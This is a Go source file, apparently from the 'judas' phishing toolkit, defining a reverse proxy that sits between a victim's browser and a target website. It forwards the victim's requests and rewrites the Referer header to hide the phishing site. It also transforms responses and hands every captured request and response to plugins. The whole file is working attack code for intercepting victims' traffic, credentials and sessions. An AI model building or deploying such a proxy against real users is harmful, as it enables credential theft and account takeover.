package main

import (
	"bufio"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/joncooperworks/judas/plugins"
)

// PhishingProxy proxies requests between the victim and the target, queuing requests for further processing.
type PhishingProxy struct {
	client               *http.Client
	targetURL            *url.URL
	responseTransformers []ResponseTransformer
}

func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error) {
	target := request.URL
	target.Scheme = p.targetURL.Scheme
	target.Host = p.targetURL.Host

	req, err := http.NewRequest(request.Method, target.String(), request.Body)
	if err != nil {
		return nil, err
	}
	for key := range request.Header {
		req.Header.Set(key, request.Header.Get(key))
	}

	// Don't let a stray referer header give away the location of our site.
	// Note that this will not prevent leakage from full URLs.
	if request.Referer() != "" {
		req.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
	}

	// Go supports gzip compression, but not Brotli.
	// Since the underlying transport handles compression, remove this header to avoid problems.
	req.Header.Del("Accept-Encoding")
	return req, nil
}

// HandleConnection does the actual work of proxying the HTTP request between the victim and the target.
// Accepts the TCP connection from the victim's browser and a channel to send http Requests on to the processing worker thread.
func (p *PhishingProxy) HandleConnection(
	conn net.Conn,
	transactions chan<- plugins.HTTPTransaction,
) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	request, err := http.ReadRequest(reader)
	if err != nil {
		log.Println("Error parsing request:", err.Error())
		return
	}

	req, err := p.copyRequest(request)
	if err != nil {
		log.Println("Error cloning request.")
		return
	}
	resp, err := p.client.Do(req)
	if err != nil {
		log.Println("Proxy error:", err.Error())
		return
	}

	for _, transformer := range p.responseTransformers {
		err := transformer.Transform(resp)
		if err != nil {
			log.Println("Error transforming:", err.Error())
		}
	}

	modifiedResponse, err := httputil.DumpResponse(resp, true)
	if err != nil {
		log.Println("Error converting requests to bytes:", err.Error())
		return
	}

	_, err = conn.Write(modifiedResponse)
	if err != nil {
		log.Println("Error responding to victim:", err.Error())
		return
	}
	transactions <- plugins.HTTPTransaction{
		Request:  *req,
		Response: *resp,
	}
}
